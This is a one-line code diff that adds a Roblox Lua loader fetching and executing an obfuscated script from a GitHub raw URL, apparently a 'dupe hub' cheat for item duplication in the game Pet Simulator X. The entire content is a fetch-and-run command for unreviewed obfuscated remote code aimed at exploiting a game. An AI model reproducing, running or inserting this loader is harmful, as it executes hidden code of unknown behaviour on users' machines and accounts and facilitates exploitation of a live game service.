@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HaystRBX/PSX-OP-DUPE-HUB-V2/main/dupev2Obfuscated.lua"))()
